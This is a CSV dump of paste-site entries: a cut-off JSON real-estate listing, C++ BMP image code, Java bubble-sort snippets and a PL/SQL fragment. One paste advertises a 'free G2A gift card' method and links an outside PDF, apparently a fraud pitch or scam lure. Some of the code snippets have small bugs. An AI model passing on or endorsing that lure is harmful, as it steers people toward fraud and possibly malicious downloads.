id,title,username,language,date,content
                        ""icon"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/realty/constructor/kitchen/Frame_26649_3.png"",
                        ""title"": ""White Gloss"",
                        ""ref_id"": 100000002
                    },
                    ""ref_id"": null,
                    ""title"": ""White Gloss standard"",
                    ""description"": ""<p>Высота кухни 2 470 мм. Фасады на выбор матовая / глянцевая пленка, цвет серый + белый / белый. Каркас - цвет белый. Европейская фурнитура.</p>"",
                    ""default"": false,
                    ""order"": 8,
                    ""for_landing"": true,
                    ""has_machinery"": true,
                    ""parent"": null,
                    ""category"": 1
                },
                ""price"": 920865,
                ""ref_id"": ""dabc5118-0e6c-ee11-b824-005056b8a6c4"",
                ""has_machinery"": true,
                ""toggle_markup"": true
            },
            {
                ""category"": {
                    ""id"": 85,
                    ""title"": ""Оптимум дом продольный"",
                    ""slug"": ""optimum_house_prod"",
                    ""description"": """",
                    ""icon"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/realty/constructor/kitchen/image_22307_vvSCiBb_4040_o8pqUpe_uENRBjT.png"",
                    ""order"": 0,
                    ""ref_id"": 100000013
                },
                ""id"": ""d6bc5118-0e6c-ee11-b824-005056b8a6c4"",
                ""kitchen"": {
                    ""id"": 458,
                    ""advantages"": [
                        {
                            ""id"": 1669,
                            ""property"": ""Материал фасада"",
                            ""title"": ""МДФ в глянцевой пленке"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1670,
                            ""property"": ""Ручки"",
                            ""title"": ""Накладные для нижних фасадов.  Верхние секции без лицевой фурнитуры - ручка Air"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1671,
                            ""property"": ""Фурнитура"",
                            ""title"": ""Европейская с доводчиками"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1672,
                            ""property"": ""Столешница и стеновая панель"",
                            ""title"": ""Пластик HPL 4 категории"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1673,
                            ""property"": ""Цвет каркаса"",
                            ""title"": ""Белый"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1674,
                            ""property"": ""Высота кухни"",
                            ""title"": ""2470 мм"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1675,
                            ""property"": ""Сантехника"",
                            ""title"": ""Мойка из нержавеющей стали, смеситель - хромированный"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1676,
                            ""property"": ""Аксессуары"",
                            ""title"": ""Интегрируемая розетка в столешнице"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1677,
                            ""property"": ""Дополнения"",
                            ""title"": ""1. Кухня длиннее 2. Есть посудомоечная машина 3. Варочная панель на 4 конфорки 4. Над холодильником есть секция и обшивка по бокам 5. Навесные шкафы выше (960 мм)"",
                            ""help_text"": """"
                        },
                        {
                            ""id"": 1678,
                            ""property"": ""Комплект бытовой техники (Haier или аналоги)"",
                            ""title"": ""Встраиваемая техника:духовой шкаф, вытяжка, посудомоечная машина, варочная панель на 4 конфорки; холодильник отдельностоящий"",
                            ""help_text"": """"
                        }
                    ],
                    ""image_list"": [],
                    ""style"": {
                        ""id"": 1,
                        ""icon"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/realty/constructor/kitchen/Frame_26649_3.png"",
                        ""title"": ""White Gloss"",
                        ""ref_id"": 100000002
                    },
                    ""ref_id"": null,
                    ""title"": ""White Gloss optimum_house_prod"",
                    ""description"": ""<p>Высота кухни 2 230 мм. Фасады - белые, глянцевые. Каркас - цвет белый. Европейская фурнитура.</p>"",
                    ""default"": false,
                    ""order"": 0,
                    ""for_landing"": false,
                    ""has_machinery"": true,
                    ""parent"": null,
                    ""category"": 85
                },
                ""price"": 956602,
                ""ref_id"": ""d6bc5118-0e6c-ee11-b824-005056b8a6c4"",
                ""has_machinery"": true,
                ""toggle_markup"": true
            }
        ],
        ""kitchen_without_machinery"": []
    },
    ""furnitures"": [],
    ""additional_buildings"": [
        {
            ""ref_id"": ""aa6969fb-cd11-ee11-b824-005056b8a6c4"",
            ""pk"": 3,
            ""title"": ""Беседка"",
            ""description"": ""Открытая беседка с местом для барбекю."",
            ""images"": [
                {
                    ""id"": 1,
                    ""features"": [],
                    ""order"": 0,
                    ""image"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/realty/additional_building/image/Villa_%D0%B1%D0%B5%D1%81%D0%B5%D0%B4%D0%BA%D0%B0_2023-10-17.jpg""
                }
            ],
            ""price"": 295000,
            ""old_price"": 295000,
            ""order"": 0,
            ""is_active"": true,
            ""discount"": null
        },
        {
            ""ref_id"": ""b06969fb-cd11-ee11-b824-005056b8a6c4"",
            ""pk"": 5,
            ""title"": ""Хозяйственная постройка"",
            ""description"": ""Хозбудка для хранения садовых инструментов."",
            ""images"": [
                {
                    ""id"": 2,
                    ""features"": [],
                    ""order"": 0,
                    ""image"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/realty/additional_building/image/Villa_%D1%85%D0%BE%D0%B7%D0%B1%D0%BB%D0%BE%D0%BA_2023-10-17.jpg""
                }
            ],
            ""price"": 445000,
            ""old_price"": 445000,
            ""order"": 0,
            ""is_active"": true,
            ""discount"": null
        },
        {
            ""ref_id"": ""c8530f63-201b-ee11-b824-005056b8a6c4"",
            ""pk"": 6,
            ""title"": ""Баня"",
            ""description"": ""В едином стиле с вашим домом."",
            ""images"": [
                {
                    ""id"": 3,
                    ""features"": [],
                    ""order"": 0,
                    ""image"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/realty/additional_building/image/Villa_%D0%B1%D0%B0%D0%BD%D1%8F_2023-10-17.jpg""
                }
            ],
            ""price"": 955000,
            ""old_price"": 955000,
            ""order"": 0,
            ""is_active"": true,
            ""discount"": null
        },
        {
            ""Навес для автомобиля"": [
                {
                    ""ref_id"": ""d06969fb-cd11-ee11-b824-005056b8a6c4"",
                    ""pk"": 9,
                    ""title"": ""1 автомобиль"",
                    ""description"": """",
                    ""images"": [
                        {
                            ""id"": 4,
                            ""features"": [],
                            ""order"": 0,
                            ""image"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/realty/additional_building/image/Villa_%D0%BD%D0%B0%D0%B2%D0%B5%D1%81_%D0%B4%D0%BB%D1%8F_2%D1%85_%D0%BC%D0%B0%D1%88%D0%B8%D0%BD_2023-10-17_R95LSpu.jpg""
                        }
                    ],
                    ""price"": 335000,
                    ""old_price"": 335000,
                    ""order"": 0,
                    ""is_active"": true,
                    ""discount"": null
                },
                {
                    ""ref_id"": ""d26969fb-cd11-ee11-b824-005056b8a6c4"",
                    ""pk"": 8,
                    ""title"": ""2 автомобиля"",
                    ""description"": """",
                    ""images"": [
                        {
                            ""id"": 5,
                            ""features"": [],
                            ""order"": 0,
                            ""image"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/realty/additional_building/image/Villa_%D0%BD%D0%B0%D0%B2%D0%B5%D1%81_%D0%B4%D0%BB%D1%8F_1_%D0%BC%D0%B0%D1%88%D0%B8%D0%BD%D1%8B_2023-10-17_pwrPbE5.jpg""
                        }
                    ],
                    ""price"": 635000,
                    ""old_price"": 635000,
                    ""order"": 0,
                    ""is_active"": true,
                    ""discount"": null
                }
            ]
        }
    ],
    ""landscape_solutions"": [
        {
            ""ref_id"": ""de6969fb-cd11-ee11-b824-005056b8a6c4"",
            ""pk"": 1,
            ""title"": ""Плодовый сад"",
            ""description"": ""Плодовые деревья и кустарники в сочетании декоративными растениями подарят возможность лакомиться собственными фруктами и ягодами каждый год."",
            ""images"": [
                {
                    ""id"": 2,
                    ""features"": [],
                    ""order"": 0,
                    ""image"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/realty/landscape_solution/image/orchardApple_21InTbM.jpg""
                }
            ],
            ""price"": 155000,
            ""old_price"": 155000,
            ""order"": 0,
            ""is_active"": true,
            ""discount"": null
        },
        {
            ""ref_id"": ""a66969fb-cd11-ee11-b824-005056b8a6c4"",
            ""pk"": 2,
            ""title"": ""Декоративный сад"",
            ""description"": ""Хвойные деревья, кустарники и декоративные растения. Благодаря сочетанию сезонных и хвойных растений, сад остается зеленым круглый год."",
            ""images"": [
                {
                    ""id"": 1,
                    ""features"": [],
                    ""order"": 0,
                    ""image"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/realty/landscape_solution/image/pine_Q4BKs55.jpg""
                }
            ],
            ""price"": 155000,
            ""old_price"": 155000,
            ""order"": 0,
            ""is_active"": true,
            ""discount"": null
        }
    ],
    ""hedges"": [],
    ""hedge_markup"": 18600,
    ""terrace_markups"": [],
    ""renovation_markup"": {
        ""ref_id"": null
    },
    ""kitchen_markup"": 0,
    ""building"": 2279,
    ""price_with_kitchen"": 12111492,
    ""old_price_with_kitchen"": 12111492,
    ""electricity"": true,
    ""water_supply"": true,
    ""gas"": true,
    ""projecttrait_set"": [
        {
            ""id"": 232,
            ""name"": ""Отделка"",
            ""text"": ""Дома под ключ с готовой отделкой и ком­муни­каци­ями"",
            ""icon"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/project/traits/Icons_8t6nNbT.svg"",
            ""order"": 0,
            ""for_business_class"": false
        },
        {
            ""id"": 233,
            ""name"": ""Индиви­дуаль­ность"",
            ""text"": ""Единый дизайн-код"",
            ""icon"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/project/traits/Icons_7uc6f8y.svg"",
            ""order"": 1,
            ""for_business_class"": false
        },
        {
            ""id"": 234,
            ""name"": ""Архитектура"",
            ""text"": ""Современные технологии строительства"",
            ""icon"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/project/traits/Namebank-museum_Size64.svg"",
            ""order"": 2,
            ""for_business_class"": false
        },
        {
            ""id"": 235,
            ""name"": ""Наедине с природой"",
            ""text"": ""Парки, пруд с набережной и леса рядом с домом"",
            ""icon"": ""https://storage.yandexcloud.net/media.dev.samolet.ru/samolet-development-new/project/traits/Icons_yMsmFBg.svg"",
            ""order"": 3,
            ""for_business_class"": false
        }
    ],
    ""azimuth"": 0,
    ""similar_params"": ""?price_min=10105345&price_max=12350978&building=2279&bedroom_count=2"",
    ""technology"": ""Дом из газобетонных блоков"",
    ""acquiring_amount"": 10000
}"
piNJFXVT,G2A.com Free Gift Card Guide Mar 2024 Updated,HastyBasher0,GetText,Monday 11th of March 2024 06:32:49 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!

You can buy gift cards directly with it or you can buy popular games then put them on fresh steam accounts and then sell those accounts.

This is not my pastebin account and im using a random inactive one to post this.
 
PDF guide here:
https://smallpdf.com/file#s=e45853d1-004b-4ae4-968e-c4f2afc13e32
 
Working as of:
11 March 2024















































"
2h8RwsjH,Negate,Gorodwest,C++,Monday 11th of March 2024 06:20:16 AM CDT,"#include ""bmp_image.h""

#include <array>
#include <fstream>
#include <string_view>

#include ""pack_defines.h""

using namespace std;

namespace img_lib {

PACKED_STRUCT_BEGIN BitmapFileHeader {
  // поля заголовка Bitmap File Header
  uint8_t signature[2]{'B', 'M'};  // symbols BM
  uint32_t size = 0;               // step (GetBMPStride) * height
  uint32_t reserve = 0;            // zeros
  uint32_t step = 54;              // BitmapFileHeader + BitmapInfoHeader
}
PACKED_STRUCT_END

PACKED_STRUCT_BEGIN BitmapInfoHeader {
  // поля заголовка Bitmap Info Header
  uint32_t size = 40;
  int32_t width = 0;
  int32_t height = 0;
  uint16_t plate = 1;
  uint16_t bitPerPixel = 24;
  uint32_t compression = 0;
  uint32_t bytes = 0;
  int32_t hRes = 11811;
  int32_t vRes = 11811;
  int32_t colors = 0;
  int32_t valuableColors = 0x1000000;
}
PACKED_STRUCT_END

// функция вычисления отступа по ширине
static int GetBMPStride(int w) { return 4 * ((w * 3 + 3) / 4); }

// напишите эту функцию
bool SaveBMP(const Path& file, const Image& image) {
  ofstream out(file, ios::binary);
  const int width = image.GetWidth();
  const int height = image.GetHeight();
  const int step = GetBMPStride(width);

  BitmapFileHeader fileHeader;
  fileHeader.size = step;
  BitmapInfoHeader infoHeader;
  infoHeader.width = width;
  infoHeader.height = height;
  infoHeader.bytes = GetBMPStride(width);

  out.write(reinterpret_cast<const char*>(&fileHeader),
            sizeof(BitmapFileHeader));
  out.write(reinterpret_cast<const char*>(&infoHeader),
            sizeof(BitmapInfoHeader));
    
  vector<char> buf(GetBMPStride(width));  
  for (int y = height - 1; y >= 0; --y) {
    for (int x = 0; x < width; ++x) {
      const auto& pixel = image.GetPixel(x, y);
      buf[x * 3] = static_cast<char>(pixel.b);
      buf[x * 3 + 1] = static_cast<char>(pixel.g);
      buf[x * 3 + 2] = static_cast<char>(pixel.r);
    }
    out.write(buf.data(), step);
  }
  return out.good();
}

// напишите эту функцию
Image LoadBMP(const Path& file) {
  BitmapFileHeader fileHeader;
  BitmapInfoHeader infoHeader;
  ifstream ifs(file, ios::binary);

  ifs.read(reinterpret_cast<char*>(&fileHeader), sizeof(BitmapFileHeader));
  ifs.read(reinterpret_cast<char*>(&infoHeader), sizeof(BitmapInfoHeader));
    
  const int width = infoHeader.width;
  const int height = infoHeader.height;
  const int step = GetBMPStride(width);

  Image image(width, height, Color::Black());
  vector<char> buf(step); 

  for (int y = height - 1; y >= 0; --y) {
    ifs.read(buf.data(), step);
    for (int x = 0; x < width; ++x) {
      auto& pixel = image.GetPixel(x, y);
      pixel.b = static_cast<byte>(buf[x * 3]);
      pixel.g = static_cast<byte>(buf[x * 3 + 1]);
      pixel.r = static_cast<byte>(buf[x * 3 + 2]);
    }
  }
  return image;
}

}  // namespace img_lib"
necTu0mq,Comparable BubbleSort.java,Aldin_SXR,Java,Monday 11th of March 2024 06:12:23 AM CDT,"public class BubbleSort {
    /* Swap marker; whether there was a swap in the inner loop */
    static boolean swapped;

    /* Perform the bubble sort algorithm */
    public static <Data extends Comparable<Data>> void sort(Data[] elements) {
        for (int i = 0; i < elements.length; i++) {
            for (int j = 1; j < elements.length - i; j++) {
                if (elements[j - 1].compareTo(elements[j]) > 0) {
                    swap(elements, j - 1, j);
                }
            }

            /* If no two elements were swapped by inner loop, then break  */
            if (!swapped) {
                break;
            }
        }
    }

    /* Swap two array elements: elements[a] with elements[b] */
    public static <Data extends Comparable<Data>> void swap(Data[] elements, int a, int b) {
        Data tmp = elements[a];
        elements[a] = elements[b];
        elements[b] = tmp;
        swapped = true; // a swap has occurred
    }
}"
i8TciG9G,comparable swap(),Aldin_SXR,Java,Monday 11th of March 2024 06:11:53 AM CDT,"/* Swap two array elements: elements[a] with elements[b] */
public static <Data extends Comparable<Data>> void swap(Data[] elements, int a, int b) {
    Data tmp = elements[a];
    elements[a] = elements[b];
    elements[b] = tmp;
    swapped = true; // a swap has occurred
}"
SxqrM1Xj,comparable bubble sort(),Aldin_SXR,Java,Monday 11th of March 2024 06:10:37 AM CDT,"public static <Data extends Comparable<Data>> void sort(Data[] elements) {
    for (int i = 0; i < elements.length; i++) {
        for (int j = 1; j < elements.length - i; j++) {
            if (elements[j - 1].compareTo(elements[j]) > 0) {
                swap(elements, j - 1, j);
            }
        }

        /* If no two elements were swapped by inner loop, then break  */
        if (!swapped) {
            break;
        }
    }
}"
kkqmWNSV,Student.java,Aldin_SXR,Java,Monday 11th of March 2024 06:07:11 AM CDT,"public class Student implements Comparable<Student> {
    String fullName;
    String department;
    double gpa;

    /* Constructor: set initial values of the Student object */
    public Student(String fullName, String department, double gpa) {
        this.fullName = fullName;
        this.department = department;
        this.gpa = gpa;
    }

    /* Compare ""this"" student to ""that"" student (the other object) */
    public int compareTo(Student that) {								// 1
        if (this.gpa > that.gpa) {										// 2
            return 1;													// 2
        } else if (this.gpa < that.gpa) {								// 3
            return -1;													// 3
        } else {														// 4
            return 0;													// 4
        }
    }
}
"
kdRBA865,BubbleSort.java,Aldin_SXR,Java,Monday 11th of March 2024 06:03:23 AM CDT,"public class BubbleSort {
    /* Swap marker; whether there was a swap in the inner loop */
    static boolean swapped;

    /* Perform the bubble sort algorithm */
    public static void sort(int[] elements) {
        for (int i = 0; i < elements.length; i++)  {                // 1
            swapped = false; // reset swap                          // 2

            for (int j = 1; j < elements.length - i; j++) {         // 3
                if (elements[j - 1] > elements[j]) {                // 4
                    swap(elements, j - 1, j);                    // 5
                }
            }

            /* If no two elements were swapped by inner loop, then break  */
            if (!swapped) {                                         // 6
                break;                                              // 6
            }
        }
    }

    /* Swap two array elements: elements[a] with elements[b] */
    public static void swap(int[] elements, int a, int b) {
        int tmp = elements[a];
        elements[a] = elements[b];
        elements[b] = tmp;
        swapped = true; // a swap has occurred
    }
}"
VwN67032,bubble swap(),Aldin_SXR,Java,Monday 11th of March 2024 06:01:46 AM CDT,"public static void swap(int[] elements, int a, int b) {
    int tmp = elements[a];
    elements[a] = elements[b];
    elements[b] = tmp;
    swapped = true; // a swap has occurred
}"
ti1VKzYC,Untitled,ILyaCyclone,PL/SQL,Monday 11th of March 2024 06:01:20 AM CDT,"
/*
 Возвращает формулировку итога очного тура, то есть всей олимпиады
*/
